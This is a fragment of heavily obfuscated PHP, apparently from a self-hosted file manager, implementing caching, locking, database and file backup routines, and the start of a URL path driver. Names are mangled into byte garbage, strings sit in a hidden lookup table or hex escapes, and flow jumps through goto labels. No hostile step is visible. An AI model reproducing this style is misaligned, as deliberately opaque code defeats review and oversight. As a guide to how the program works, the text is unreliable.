$ĞÜ´·ˆñ[921]: self::$handle = new CacheMemcached($Õé‡‹üç, $û¨®†§¤); break; case $ĞÜ´·ˆñ[232]: self::$handle = new CacheFile($Õé‡‹üç, $û¨®†§¤); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Éì—‹‰õ) { if (is_array($Éì—‹‰õ) || is_object($Éì—‹‰õ)) { $Éì—‹‰õ = json_encode($Éì—‹‰õ); } $Éì—‹‰õ = rawurlencode($Éì—‹‰õ); return md5(KOD_SITE_ID . $_SERVER[™¸œØ®Ü][11] . $Éì—‹‰õ); } public static function get($ş°‘½¯¦, $ãÍ ü½Š = false) { $Àİ‡Òïı = self::key($ş°‘½¯¦); $ê£»©Şâ = self::init(); if ($ãÍ ü½Š) { return unserialize($ê£»©Şâ->get($Àİ‡Òïı)); } if (!isset(self::$memoryCache[$Àİ‡Òïı])) { $˜£¦—É· = $ê£»©Şâ->get($Àİ‡Òïı); self::$memoryCache[$Àİ‡Òïı] = unserialize($˜£¦—É·); } return self::$memoryCache[$Àİ‡Òïı]; } public static function set($€€Ì¡¥, $… Ë£šÏ, $œÁÉÌ = false) { $ ©ï¦Ñ =& $_SERVER[™¸œØ®Ü]; $şùÎ¼« = self::key($€€Ì¡¥); if (isset(self::$memoryCache[$şùÎ¼«]) && self::$memoryCache[$şùÎ¼«] === $… Ë£šÏ) { return !0; } if ($œÁÉÌ === 0) { self::$memoryCache[$şùÎ¼«] = $… Ë£šÏ; return !0; } $ğÔÉ§ñ = self::init(); $¡åÅÜ•Â = serialize($… Ë£šÏ); CacheLock::lock($€€Ì¡¥ . $ ©ï¦Ñ[922]); $ê¤ÉÉÎß = $ğÔÉ§ñ->set($şùÎ¼«, $¡åÅÜ•Â, $œÁÉÌ); self::$memoryCache[$şùÎ¼«] = $… Ë£šÏ; CacheLock::unlock($€€Ì¡¥ . $ ©ï¦Ñ[922]); return $ê¤ÉÉÎß; } public static function getCall($íÓ—ü‚—, $ø–†ä¿ê, $ËªÅ—«–, $ö¦•¿× = array()) { $Â¸õ‹ˆ® =& $_SERVER[™¸œØ®Ü]; $´ÑÎ‰ê = self::get($íÓ—ü‚—); if ($´ÑÎ‰ê || $´ÑÎ‰ê === $Â¸õ‹ˆ®[12]) { return $´ÑÎ‰ê; } $´ÑÎ‰ê = call_user_func_array($ËªÅ—«–, $ö¦•¿×); $´ÑÎ‰ê = $´ÑÎ‰ê ? $´ÑÎ‰ê : $Â¸õ‹ˆ®[12]; self::set($íÓ—ü‚—, $´ÑÎ‰ê, $ø–†ä¿ê); return $´ÑÎ‰ê; } public static function remove($€®µà¦¨) { $Ëæø“öñ = self::key($€®µà¦¨); unset(self::$memoryCache[$Ëæø“öñ]); self::clearTimeout(); CacheLock::lock($€®µà¦¨); $Ÿ‹ÇÌ¥ = self::init()->remove($Ëæø“öñ); CacheLock::unlock($€®µà¦¨); return $Ÿ‹ÇÌ¥; } public static function removeMemory($ÃÇ³ÒİÄ) { $Ç×ïÒü– = self::key($ÃÇ³ÒİÄ); unset(self::$memoryCache[$Ç×ïÒü–]); } public static function clearMemory($Í“ÖÙé = false) { if ($Í“ÖÙé) { $Í“ÖÙé = self::key($Í“ÖÙé); unset(self::$memoryCache[$Í“ÖÙé]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[™¸œØ®Ü][923])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[™¸œØ®Ü][924])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($–ïøä­, $µÊäÁ¤Ú) { $³Ñ¯æ·¼ =& $_SERVER[™¸œØ®Ü]; $this->cachePath = $–ïøä­[$³Ñ¯æ·¼[87]]; $this->prefix = $³Ñ¯æ·¼[925]; $this->cacheTime = $µÊäÁ¤Ú; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($×†¾ŠŸ) { $ÅÁÂÊâ =& $_SERVER[™¸œØ®Ü]; $×†¾ŠŸ = str_replace(array($ÅÁÂÊâ[926], $ÅÁÂÊâ[100], $ÅÁÂÊâ[76]), $ÅÁÂÊâ[927], $×†¾ŠŸ); return $this->cachePath . $ÅÁÂÊâ[928] . $×†¾ŠŸ . $ÅÁÂÊâ[929]; } public function set($Øñ’”Ø, $í¨¿ú›Ê, $ü•¼øş = false) { $ü•¼øş = $ü•¼øş ? $ü•¼øş : $this->cacheTime; $êÂœü·œ = $this->getFile($Øñ’”Ø); if (file_put_contents($êÂœü·œ, $this->prefix . $í¨¿ú›Ê, LOCK_EX)) { @touch($êÂœü·œ, intval(time() + $ü•¼øş)); clearstatcache(); return !0; } @unlink($êÂœü·œ); return !1; } public function get($™ÖÃ€º) { $éà«‰ò = $this->getFile($™ÖÃ€º); if (file_exists($éà«‰ò) && filemtime($éà«‰ò) < time()) { @unlink($éà«‰ò); return !1; } $—áéòóŸ = @file_get_contents($éà«‰ò); return substr($—áéòóŸ, strlen($this->prefix)); } public function remove($ÑÙºù©Â) { $ÁÍ¹š¾© = $this->getFile($ÑÙºù©Â); return @unlink($ÁÍ¹š¾©); } public function deleteAll() { $ŒË ¿¹« =& $_SERVER[™¸œØ®Ü]; $ŒÉ±Åš = scandir($this->cachePath); foreach ($ŒÉ±Åš as $¢ÙØªÒÙ) { $Ñ±¦ıì = $this->cachePath . $¢ÙØªÒÙ; if (strpos($Ñ±¦ıì, $ŒË ¿¹«[929]) && strpos($Ñ±¦ıì, $ŒË ¿¹«[930])) { @unlink($Ñ±¦ıì); } } } public function clearTimeout() { $”¬Â©›ê =& $_SERVER[™¸œØ®Ü]; $äî´’óæ = scandir($this->cachePath); foreach ($äî´’óæ as $îÍÆİîÈ) { $®ğéüÁ‘ = $this->cachePath . $îÍÆİîÈ; if (strpos($®ğéüÁ‘, $”¬Â©›ê[929]) && strpos($®ğéüÁ‘, $”¬Â©›ê[930]) && filemtime($®ğéüÁ‘) < time()) { @unlink($®ğéüÁ‘); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $²ıÓ½à¤ =& $_SERVER[™¸œØ®Ü]; if (self::$handle) { return self::$handle; } $¨Ùë…¨Ô = $GLOBALS[$²ıÓ½à¤[6]][$²ıÓ½à¤[426]]; self::$timeout = $¨Ùë…¨Ô[$²ıÓ½à¤[931]] ? $¨Ùë…¨Ô[$²ıÓ½à¤[931]] : 10; $á°¨®€ = _get($GLOBALS[$²ıÓ½à¤[6]], $²ıÓ½à¤[932]); $¡Ş¥¢¨ = $¨Ùë…¨Ô[$²ıÓ½à¤[917]] ? $¨Ùë…¨Ô[$²ıÓ½à¤[917]] : $²ıÓ½à¤[232]; if ($¡Ş¥¢¨ == $²ıÓ½à¤[21] && $á°¨®€ == $²ıÓ½à¤[13]) { $¡Ş¥¢¨ = $²ıÓ½à¤[232]; } switch ($¡Ş¥¢¨) { case $²ıÓ½à¤[920]: self::$handle = new CacheLockRedis(); break; case $²ıÓ½à¤[921]: self::$handle = new CacheLockMemcached(); break; case $²ıÓ½à¤[21]: self::$handle = new CacheLockDatabase(); break; case $²ıÓ½à¤[232]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($²ıÓ½à¤[933], $²ıÓ½à¤[934]); } return self::$handle; } private static function key($ÇÑ£êì) { return $_SERVER[™¸œØ®Ü][935] . Cache::key($ÇÑ£êì); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($â¿ÉªË = '') { self::$errorMsg = $â¿ÉªË; } public static function lockGlobal($ñÈÓ£ÊË, $§îµñÍÊ) { return self::lock($ñÈÓ£ÊË, $§îµñÍÊ, !0); } public static function lock($¯ âª×Ñ, $“™³¦ÉÉ = false, $Õ”‹²ó = false) { $øŒå›’• =& $_SERVER[™¸œØ®Ü]; $ß±òõŒõ = self::init(); $÷İ½‰»– = self::key($¯ âª×Ñ); $“™³¦ÉÉ = $“™³¦ÉÉ ? $“™³¦ÉÉ : self::$timeout; $‹ÉÖÍİ» = timeFloat(); if ($GLOBALS[$øŒå›’•[936]]) { if (!$ß±òõŒõ->lock($÷İ½‰»–, 0.2)) { die; } return !0; } $Ÿ“´Ä†º = $ß±òõŒõ->lock($÷İ½‰»–, $“™³¦ÉÉ); $„Í¨ñ€¬ = timeFloat(); if (!$Ÿ“´Ä†º) { $Ÿİ°ªŞ¼ = "\154\157\x63\153\x20\x65\x72\x72\x6f\162\x3b\x6b\x65\x79\x3d{$¯ âª×Ñ}\73\164\x69\x6d\x65\75{$“™³¦ÉÉ}\73" . self::$errorMsg . $øŒå›’•[74] . get_caller_msg(); $¼¡¦¨ğ± = LNG($øŒå›’•[937]) . "\50{$“™³¦ÉÉ}\x73\51\x2e" . LNG($øŒå›’•[938]); $¼¡¦¨ğ± .= $øŒå›’•[939]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¼¡¦¨ğ± = $¼¡¦¨ğ± . $øŒå›’•[940] . self::$errorMsg; } write_log($øŒå›’•[941] . sprintf($øŒå›’•[942], timeFloat() - $‹ÉÖÍİ») . $øŒå›’•[943] . $Ÿİ°ªŞ¼ . $øŒå›’•[944] . json_encode(error_get_last()), $øŒå›’•[934]); show_json($¼¡¦¨ğ±, !1); } if (!$Õ”‹²ó) { self::$lockItem[$÷İ½‰»–] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $üíãŠÃ = number_format(timeFloat() - $„Í¨ñ€¬, 3); write_log($øŒå›’•[945] . $¯ âª×Ñ . $øŒå›’•[946] . $üíãŠÃ, $øŒå›’•[934]); } return $Ÿ“´Ä†º; } public static function lockGet($ª¾íÏÙà) { $Æî„á´ = self::key($ª¾íÏÙà); if (self::$lockItem[$Æî„á´]) { return self::$lockItem[$Æî„á´]; } return self::init()->lockGet($Æî„á´); } public static function unlock($öƒ´ûšü) { $İ·ƒ‚—ü =& $_SERVER[™¸œØ®Ü]; $ì®Şª§  = self::key($öƒ´ûšü); self::$lockItem[$ì®Şª§ ] = null; self::init()->unlock($ì®Şª§ ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($İ·ƒ‚—ü[947] . $öƒ´ûšü, $İ·ƒ‚—ü[934]); } return; } public static function unlockRuntime() { $ŸİÓ¥¥ =& $_SERVER[™¸œØ®Ü]; $ŠÄûùÊ… = self::init(); $‚Şş÷Ÿè = !1; foreach (self::$lockItem as $úÁô‡©œ => $¤œı»‡õ) { if (!$¤œı»‡õ) { continue; } $ŠÄûùÊ…->unlock($úÁô‡©œ); if (!$‚Şş÷Ÿè) { $‚Şş÷Ÿè = !0; write_log($ŸİÓ¥¥[948] . $úÁô‡©œ . $ŸİÓ¥¥[74] . get_caller_msg(), $ŸİÓ¥¥[934]); continue; } write_log($ŸİÓ¥¥[948] . $úÁô‡©œ, $ŸİÓ¥¥[934]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¿ŠŠÇ™ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ŸİÓ¥¥[949] . $¿ŠŠÇ™ . $ŸİÓ¥¥[950] . ACTION, $ŸİÓ¥¥[934]); } } public static function fileLock($äÃúêÍ) { $æ•ì¾“ó =& $_SERVER[™¸œØ®Ü]; if (!$GLOBALS[$æ•ì¾“ó[951]]) { $GLOBALS[$æ•ì¾“ó[951]] = array(); } $GLOBALS[$æ•ì¾“ó[951]][$äÃúêÍ] = !1; $Î­¤ÅÉ = fopen(DATA_PATH . $äÃúêÍ . $æ•ì¾“ó[952], $æ•ì¾“ó[953]); if (!$Î­¤ÅÉ) { return !1; } $GLOBALS[$æ•ì¾“ó[951]][$äÃúêÍ] = $Î­¤ÅÉ; if (flock($Î­¤ÅÉ, LOCK_EX)) { return !0; } self::unlock($äÃúêÍ); show_json($æ•ì¾“ó[954], !1); return !1; } public static function fileUnlock($¹ãÜÈ’Ù) { $êµ¶Äƒû =& $_SERVER[™¸œØ®Ü]; $µšĞ›Ä = $GLOBALS[$êµ¶Äƒû[951]][$¹ãÜÈ’Ù]; if (!$µšĞ›Ä) { return; } $GLOBALS[$êµ¶Äƒû[951]][$¹ãÜÈ’Ù] = !1; flock($µšĞ›Ä, LOCK_UN); fclose($µšĞ›Ä); } public static function fileUnlockAll() { $ÙŸ…Ã¶Ÿ =& $_SERVER[™¸œØ®Ü]; if (!isset($GLOBALS[$ÙŸ…Ã¶Ÿ[951]]) || !$GLOBALS[$ÙŸ…Ã¶Ÿ[951]]) { return; } foreach ($GLOBALS[$ÙŸ…Ã¶Ÿ[951]] as $¡í›³Ëü => $¡Öæƒ¼µ) { if (!$¡Öæƒ¼µ) { continue; } $GLOBALS[$ÙŸ…Ã¶Ÿ[951]][$¡í›³Ëü] = !1; flock($¡Öæƒ¼µ, LOCK_UN); fclose($¡Öæƒ¼µ); } $GLOBALS[$ÙŸ…Ã¶Ÿ[951]] = array(); } } goto AùÆÚ´ÈÆñ; F×Õø²Ù•: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ØéÒÜ…” =& $_SERVER[™¸œØ®Ü]; $ÒûÃéÀ· = Backup::get(); self::$io = $ÒûÃéÀ·[$ØéÒÜ…”[837]]; self::$name = $ÒûÃéÀ·[$ØéÒÜ…”[32]]; $¡·£»´Ù = new DbManage(); $Ê¸ úÛ = $¡·£»´Ù->dbType(); $ÂÜ‚‹° = array($ØéÒÜ…”[863] => $Ê¸ úÛ, $ØéÒÜ…”[864] => time()); Backup::set($ÂÜ‚‹°); $°òá—ç = $this->tmpFilesPath() . $ØéÒÜ…”[865] . self::$name . $ØéÒÜ…”[8]; del_dir($°òá—ç); mk_dir($°òá—ç); $óğ×›®Ä = $ïĞ¾¶Øû = 0; try { $õË°˜±» = $¡·£»´Ù->db()->getTables(); } catch (Exception $—Çªş) { Backup::log($ØéÒÜ…”[866] . $—Çªş->getMessage()); return !1; } $õË°˜±» = array_diff($õË°˜±», array($ØéÒÜ…”[867], $ØéÒÜ…”[868])); foreach ($õË°˜±» as $†ù¼ê…Ã) { if ($†ù¼ê…Ã == $ØéÒÜ…”[869]) { continue; } $óğ×›®Ä += $¡·£»´Ù->model($†ù¼ê…Ã)->count(); } $øËÊÄÛ = new Task($ØéÒÜ…”[870], $ØéÒÜ…”[862], $óğ×›®Ä, LNG($ØéÒÜ…”[871]) . $ØéÒÜ…”[872] . LNG($ØéÒÜ…”[873])); $GLOBALS[$ØéÒÜ…”[874]] = self::$name; foreach ($õË°˜±» as $†ù¼ê…Ã) { $µÙíÄŒ” = $°òá—ç . $†ù¼ê…Ã . $ØéÒÜ…”[875]; if ($†ù¼ê…Ã == $ØéÒÜ…”[869]) { @touch($µÙíÄŒ”); continue; } $ëŒÖÍáë = null; if ($†ù¼ê…Ã == $ØéÒÜ…”[876] && $ÒûÃéÀ·[$ØéÒÜ…”[171]] == $ØéÒÜ…”[861]) { $ëŒÖÍáë = self::$io; } $ïĞ¾¶Øû += $¡·£»´Ù->sqlFromDb($†ù¼ê…Ã, $µÙíÄŒ”, $øËÊÄÛ, $ëŒÖÍáë); } unset($GLOBALS[$ØéÒÜ…”[874]]); $øËÊÄÛ->end(); if ($ïĞ¾¶Øû > $óğ×›®Ä) { $óğ×›®Ä = $ïĞ¾¶Øû; } $ÂÜ‚‹° = array($ØéÒÜ…”[863] => $Ê¸ úÛ, $ØéÒÜ…”[858] => 1, $ØéÒÜ…”[877] => $óğ×›®Ä, $ØéÒÜ…”[878] => $ïĞ¾¶Øû, $ØéÒÜ…”[879] => time()); Backup::set($ÂÜ‚‹°); if ($óğ×›®Ä - $ïĞ¾¶Øû > 0) { $¤Òğıı‰ = $ØéÒÜ…”[880]; if (!stristr(I18n::getType(), $ØéÒÜ…”[881])) { $¤Òğıı‰ = $ØéÒÜ…”[882]; } Backup::log(array($¤Òğıı‰, $ÂÜ‚‹°)); return !1; } return !0; } private function tmpFilesPath() { $éÍƒŞ =& $_SERVER[™¸œØ®Ü]; $×Ñşä×Ÿ = TEMP_FILES; if ($GLOBALS[$éÍƒŞ[6]][$éÍƒŞ[92]][$éÍƒŞ[883]]) { $×Ñşä×Ÿ = $GLOBALS[$éÍƒŞ[6]][$éÍƒŞ[92]][$éÍƒŞ[883]]; if (!mk_dir($×Ñşä×Ÿ) || !is_writable($×Ñşä×Ÿ) || !IO::mkfile($×Ñşä×Ÿ . $éÍƒŞ[884])) { $×Ñşä×Ÿ = TEMP_FILES; } } return $×Ñşä×Ÿ; } } class BackupDbFile { public function __construct() { } public function index() { $Ğôû”Â¨ =& $_SERVER[™¸œØ®Ü]; $ºıÑõ¬œ = Backup::get(); $Üâé¯©— = $ºıÑõ¬œ[$Ğôû”Â¨[32]]; $÷‹áÀ‰¢ = $this->tmpFilesPath() . "\142\x61\x63\153\x75\x70\x5f{$Üâé¯©—}\57"; $©÷–øì = $this->backupPath($ºıÑõ¬œ); if (!($©÷–øì = IO::mkdir($©÷–øì))) { Backup::log($Ğôû”Â¨[885] . $©÷–øì); return !1; } $™è¦Ó™ = IO::listPath($÷‹áÀ‰¢); $¶¥õŸ¾ = isset($™è¦Ó™[$Ğôû”Â¨[86]]) ? $™è¦Ó™[$Ğôû”Â¨[86]] : array(); $Üûû¥ç‚ = array_sum(array_column($¶¥õŸ¾, $Ğôû”Â¨[79])); if (!$Üûû¥ç‚) { Backup::log($Ğôû”Â¨[886] . $÷‹áÀ‰¢); return !1; } $›ä¨çÂÊ = array($Ğôû”Â¨[887] => $Üûû¥ç‚, $Ğôû”Â¨[888] => time()); Backup::set($›ä¨çÂÊ); $®ŠÉ¤é = new TaskFileTransfer($Ğôû”Â¨[889], $Ğôû”Â¨[862], count($¶¥õŸ¾), LNG($Ğôû”Â¨[871]) . $Ğôû”Â¨[464] . LNG($Ğôû”Â¨[873]) . $Ğôû”Â¨[890]); $®ŠÉ¤é->task[$Ğôû”Â¨[848]] = $Üûû¥ç‚; foreach ($™è¦Ó™[$Ğôû”Â¨[86]] as $­â÷É¬Ş) { $²Áòè—» = IO::move($­â÷É¬Ş[$Ğôû”Â¨[87]], $©÷–øì); if (!$²Áòè—») { $®ŠÉ¤é->end(); $¬ÈÛøÉ = IO::getLastError($Ğôû”Â¨[891] . $­â÷É¬Ş[$Ğôû”Â¨[87]] . $Ğôû”Â¨[892] . $©÷–øì . $Ğôû”Â¨[178]); Backup::log($¬ÈÛøÉ); return !1; } } $„†¼µÉ¸ = new DbManage(); $Ú¿•È•å = $„†¼µÉ¸->getSqlFile(); if (!$Ú¿•È•å[$Ğôû”Â¨[893]] || !$Ú¿•È•å[$Ğôû”Â¨[13]]) { Backup::log($Ğôû”Â¨[894]); return !1; } IO::move($Ú¿•È•å[$Ğôû”Â¨[893]], $©÷–øì); IO::move($Ú¿•È•å[$Ğôû”Â¨[13]], $©÷–øì); $®ŠÉ¤é->end(); $›ä¨çÂÊ = array($Ğôû”Â¨[895] => $Üûû¥ç‚, $Ğôû”Â¨[896] => time()); Backup::set($›ä¨çÂÊ); return !0; } private function backupPath($Ë…»îÖ) { $¨Ü£¯Æ =& $_SERVER[™¸œØ®Ü]; $Ö› á÷î = $Ë…»îÖ[$¨Ü£¯Æ[32]]; $…ÑóÅ£õ = Model($¨Ü£¯Æ[855])->get($¨Ü£¯Æ[856]); $ãşĞÉ›« = substr(md5($¨Ü£¯Æ[857] . $…ÑóÅ£õ . $Ö› á÷î), 0, 8); return "\173\151\x6f\72{$Ë…»îÖ[$¨Ü£¯Æ[837]]}\175\57\x64\x61\164\141\x62\141\x73\145\57\x62\x61\143\153\x75\160\x2f" . $Ö› á÷î . $¨Ü£¯Æ[11] . $ãşĞÉ›«; } private function tmpFilesPath() { $ÄªÛÂ¢ =& $_SERVER[™¸œØ®Ü]; $ó±Õ¡Šè = TEMP_FILES; if ($GLOBALS[$ÄªÛÂ¢[6]][$ÄªÛÂ¢[92]][$ÄªÛÂ¢[883]]) { $ó±Õ¡Šè = $GLOBALS[$ÄªÛÂ¢[6]][$ÄªÛÂ¢[92]][$ÄªÛÂ¢[883]]; if (!mk_dir($ó±Õ¡Šè) || !is_writable($ó±Õ¡Šè) || !IO::mkfile($ó±Õ¡Šè . $ÄªÛÂ¢[884])) { $ó±Õ¡Šè = TEMP_FILES; } } return $ó±Õ¡Šè; } } class BackupFile { public function __construct() { } public function index() { $„‘ƒ®Ì¤ = Backup::get(); $É·Ñ‹÷ú = $„‘ƒ®Ì¤[$_SERVER[™¸œØ®Ü][370]][$_SERVER[™¸œØ®Ü][232]][$_SERVER[™¸œØ®Ü][545]]; $ş”£¸’ø = array($_SERVER[™¸œØ®Ü][546] => array($_SERVER[™¸œØ®Ü][897], $É·Ñ‹÷ú), $_SERVER[™¸œØ®Ü][898] => array($_SERVER[™¸œØ®Ü][408], $„‘ƒ®Ì¤[$_SERVER[™¸œØ®Ü][837]])); $èáŸşÒ“ = (int) Model($_SERVER[™¸œØ®Ü][876])->where($ş”£¸’ø)->count($_SERVER[™¸œØ®Ü][545]); $›§§¢ÓÎ = (int) Model($_SERVER[™¸œØ®Ü][876])->where($ş”£¸’ø)->sum($_SERVER[™¸œØ®Ü][79]); $¤§¹Õ®º = new TaskFileTransfer($_SERVER[™¸œØ®Ü][899], $_SERVER[™¸œØ®Ü][862], $èáŸşÒ“, LNG($_SERVER[™¸œØ®Ü][871]) . $_SERVER[™¸œØ®Ü][872] . LNG($_SERVER[™¸œØ®Ü][900])); $¤§¹Õ®º->task[$_SERVER[™¸œØ®Ü][848]] = $›§§¢ÓÎ; $¬®Ó²™ = array($_SERVER[™¸œØ®Ü][901] => $èáŸşÒ“, $_SERVER[™¸œØ®Ü][902] => $›§§¢ÓÎ, $_SERVER[™¸œØ®Ü][903] => time()); Backup::set($¬®Ó²™); $ÌÛÄ¿®ƒ = !0; $š¥¬àÙ = $this->storeIds(); $¡ô´Ñ¸ç = 1; $½‹Û¹ú = 1000; $š£ÎĞØ© = $ğºÑØ¸ç = 0; $™ò³»­‰ = array(); $Ëßï¥á = $Îî™£¹Æ = 0; do { $‰Á©è“¸ = $_SERVER[™¸œØ®Ü][904]; $ÛÍäıè˜ = Model($_SERVER[™¸œØ®Ü][876])->where($ş”£¸’ø)->field($‰Á©è“¸)->order($_SERVER[™¸œØ®Ü][905])->selectPage($½‹Û¹ú, $¡ô´Ñ¸ç); $ŞšŠ‹†İ = !empty($ÛÍäıè˜[$_SERVER[™¸œØ®Ü][447]]) ? $ÛÍäıè˜[$_SERVER[™¸œØ®Ü][447]] : array(); foreach ($ŞšŠ‹†İ as $¹ˆÚñì) { if (!$this->_fileExist($¹ˆÚñì, $™ò³»­‰, $š¥¬àÙ)) { Backup::log($_SERVER[™¸œØ®Ü][906] . $¹ˆÚñì[$_SERVER[™¸œØ®Ü][545]] . $_SERVER[™¸œØ®Ü][907] . $¹ˆÚñì[$_SERVER[™¸œØ®Ü][87]]); continue; } $ß¿‚†”â = $¹ˆÚñì[$_SERVER[™¸œØ®Ü][87]]; $Ş‡‡´Èß = "\173\x69\157\x3a{$„‘ƒ®Ì¤[$_SERVER[™¸œØ®Ü][837]]}\x7d" . substr($ß¿‚†”â, strlen("\173\x69\x6f\x3a{$¹ˆÚñì[$_SERVER[™¸œØ®Ü][908]]}\175")); if (IO::exist($Ş‡‡´Èß)) { $¤§¹Õ®º->updateFileEnd($¹ˆÚñì[$_SERVER[™¸œØ®Ü][32]], $¹ˆÚñì[$_SERVER[™¸œØ®Ü][79]]); } else { $Ş‡‡´Èß = get_path_father($Ş‡‡´Èß); IO::mkdir($Ş‡‡´Èß); if (!IO::copy($ß¿‚†”â, $Ş‡‡´Èß, $_SERVER[™¸œØ®Ü][909])) { Backup::log($_SERVER[™¸œØ®Ü][910] . $ß¿‚†”â . $_SERVER[™¸œØ®Ü][892] . $Ş‡‡´Èß . $_SERVER[™¸œØ®Ü][178]); $ÌÛÄ¿®ƒ = !1; break; } } $É·Ñ‹÷ú = $¹ˆÚñì[$_SERVER[™¸œØ®Ü][545]]; $ğºÑØ¸ç += 1; $š£ÎĞØ© += $¹ˆÚñì[$_SERVER[™¸œØ®Ü][79]]; $Îî™£¹Æ += 1; $Ëßï¥á += $¹ˆÚñì[$_SERVER[™¸œØ®Ü][79]]; if ($š£ÎĞØ© >= 1024 * 1024 * 100) { $¬®Ó²™ = array($_SERVER[™¸œØ®Ü][836] => $É·Ñ‹÷ú, $_SERVER[™¸œØ®Ü][911] => $Îî™£¹Æ, $_SERVER[™¸œØ®Ü][912] => $Ëßï¥á); Backup::set($¬®Ó²™); $š£ÎĞØ© = $ğºÑØ¸ç = 0; } } $¿«üÑã = count($ŞšŠ‹†İ); $¡ô´Ñ¸ç++; } while ($¿«üÑã == $½‹Û¹ú); $¤§¹Õ®º->end(); $¬®Ó²™ = array($_SERVER[™¸œØ®Ü][913] => 1, $_SERVER[™¸œØ®Ü][846] => time(), $_SERVER[™¸œØ®Ü][860] => 1, $_SERVER[™¸œØ®Ü][836] => $É·Ñ‹÷ú, $_SERVER[™¸œØ®Ü][914] => time()); if ($ğºÑØ¸ç) { $¬®Ó²™[$_SERVER[™¸œØ®Ü][911]] = $Îî™£¹Æ; $¬®Ó²™[$_SERVER[™¸œØ®Ü][912]] = $Ëßï¥á; } Backup::set($¬®Ó²™); return !0; } private function _fileExist($Ààü¡æ, &$ëƒ–òá, $¬£¿µøÖ) { $¿Ñ÷ÖÊ =& $_SERVER[™¸œØ®Ü]; $×¯±ë›« = $Ààü¡æ[$¿Ñ÷ÖÊ[87]]; if (in_array($Ààü¡æ[$¿Ñ÷ÖÊ[545]], $ëƒ–òá)) { return !1; } if (!in_array($Ààü¡æ[$¿Ñ÷ÖÊ[908]], $¬£¿µøÖ)) { return !1; } if (IO::exist($×¯±ë›«)) { return !0; } $Ş—¸İ®” = get_path_father($×¯±ë›«); if (IO::exist($Ş—¸İ®”)) { $ëƒ–òá[] = $Ààü¡æ[$¿Ñ÷ÖÊ[545]]; return !1; } $ºì÷¾ç = array($¿Ñ÷ÖÊ[908] => $Ààü¡æ[$¿Ñ÷ÖÊ[908]], $¿Ñ÷ÖÊ[87] => array($¿Ñ÷ÖÊ[461], "{$Ş—¸İ®”}\45")); $óŠ¶¢¤Ö = Model($¿Ñ÷ÖÊ[876])->where($ºì÷¾ç)->field($¿Ñ÷ÖÊ[546])->select(); $ëƒ–òá = array_merge($ëƒ–òá, array_to_keyvalue($óŠ¶¢¤Ö, $¿Ñ÷ÖÊ[12], $¿Ñ÷ÖÊ[545])); return !1; } private function _fileFilter($¨ô‡ØÆ) { $³Ñâ©¼û =& $_SERVER[™¸œØ®Ü]; return; if (empty($¨ô‡ØÆ)) { return; } $©Áö‘¬Ã = array($³Ñâ©¼û[545] => array($³Ñâ©¼û[7], array_unique($¨ô‡ØÆ))); $œŸ´Ä–Ë = Model($³Ñâ©¼û[915])->where($©Áö‘¬Ã)->field($³Ñâ©¼û[193])->select(); foreach ($œŸ´Ä–Ë as $ÁÇ¥‘Â) { Model($³Ñâ©¼û[915])->remove($ÁÇ¥‘Â[$³Ñâ©¼û[193]], !1); } } private function storeIds() { $î¨ÙÁÍ =& $_SERVER[™¸œØ®Ü]; $è·Ê¿Ë = Model($î¨ÙÁÍ[852])->listData(); $Â¼Àİˆ€ = array(); $¬ì¨şÓ = $GLOBALS[$î¨ÙÁÍ[6]][$î¨ÙÁÍ[92]][$î¨ÙÁÍ[916]]; foreach ($è·Ê¿Ë as $¢ƒó) { $çûò‰«Õ = strtolower($¢ƒó[$î¨ÙÁÍ[98]]); if (!isset($¬ì¨şÓ[$çûò‰«Õ])) { continue; } $£¹¿‰²ò = $î¨ÙÁÍ[77] . (isset($¬ì¨şÓ[$çûò‰«Õ]) ? $¬ì¨şÓ[$çûò‰«Õ] : ucfirst($çûò‰«Õ)); if (!class_exists($£¹¿‰²ò)) { continue; } $Â¼Àİˆ€[] = $¢ƒó[$î¨ÙÁÍ[477]]; } return $Â¼Àİˆ€; } } goto B¢Š°§¼Íˆ; B°ŞÖŠÉ±Ì: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Êå·Õ™à = false) { } public function exist($ÃÄµÍã) { $Ï‚¡Ç‰º = $this->info($ÃÄµÍã); return $Ï‚¡Ç‰º[$_SERVER[™¸œØ®Ü][234]]; } public function isFile($©·ñøõõ) { $ÃèÚ»Öô = $this->info($©·ñøõõ); return $ÃèÚ»Öô[$_SERVER[™¸œØ®Ü][234]]; } public function isFolder($…Óºª†‹) { return !1; } public function size($ˆº¾”ã) { $ÖœÜÒá = $this->info($ˆº¾”ã); return $ÖœÜÒá[$_SERVER[™¸œØ®Ü][79]]; } public function info($Ëò¦†ï½) { return $this->infoParse($Ëò¦†ï½); } public function infoAuth($™î¿ñşï) { return $this->infoParse($™î¿ñşï); } public function infoWithChildren($½İÄ•Ø¥) { return $this->infoParse($½İÄ•Ø¥); } public function infoFull($»ò„çïÁ) { return $this->infoParse($»ò„çïÁ); } private function infoParse($‰×¯¨‹®) { $ÏÄÖñïí =& $_SERVER[™¸œØ®Ü]; $Ä€¤àÆí = $this->header($‰×¯¨‹®); if (!$Ä€¤àÆí || !$Ä€¤àÆí[$ÏÄÖñïí[835]]) { return !1; } $Ùğ–§åä = _get($Ä€¤àÆí, $ÏÄÖñïí[414], 0); $öÅ«âƒ± = array($ÏÄÖñïí[32] => $Ä€¤àÆí[$ÏÄÖñïí[32]], $ÏÄÖñïí[87] => $‰×¯¨‹®, $ÏÄÖñïí[33] => $ÏÄÖñïí[232], $ÏÄÖñïí[79] => intval($Ùğ–§åä), $ÏÄÖñïí[169] => 